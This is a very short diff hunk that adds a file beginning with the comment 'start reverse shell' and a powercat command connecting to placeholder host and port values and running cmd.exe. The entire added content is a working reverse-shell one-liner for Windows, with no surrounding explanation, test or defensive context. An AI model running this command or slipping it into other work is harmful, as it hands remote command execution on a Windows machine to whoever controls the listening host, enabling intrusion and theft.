@@ -1,0 +1,3 @@
+# start reverse shell
+powercat -c <rhost> -p <rport> -e cmd.exe
+
